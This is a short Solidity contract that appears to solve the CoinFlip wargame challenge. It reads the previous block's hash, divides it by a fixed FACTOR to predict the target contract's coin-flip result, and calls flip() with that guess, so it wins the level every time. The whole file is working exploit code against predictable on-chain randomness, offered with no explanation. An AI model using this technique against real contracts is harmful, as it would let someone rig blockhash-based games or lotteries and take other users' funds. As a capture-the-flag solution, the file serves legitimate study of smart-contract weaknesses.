pragma solidity >=0.4.0 <0.9.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

interface CoinFlip {

  function flip(bool _guess) external returns (bool);

}

contract callMultiple {

  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function call_flip_multiple(address _addr) public {

    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coins = blockValue.div(FACTOR);

    bool side = coins == 1 ? true : false; 

    CoinFlip(_addr).flip(side);
  }

}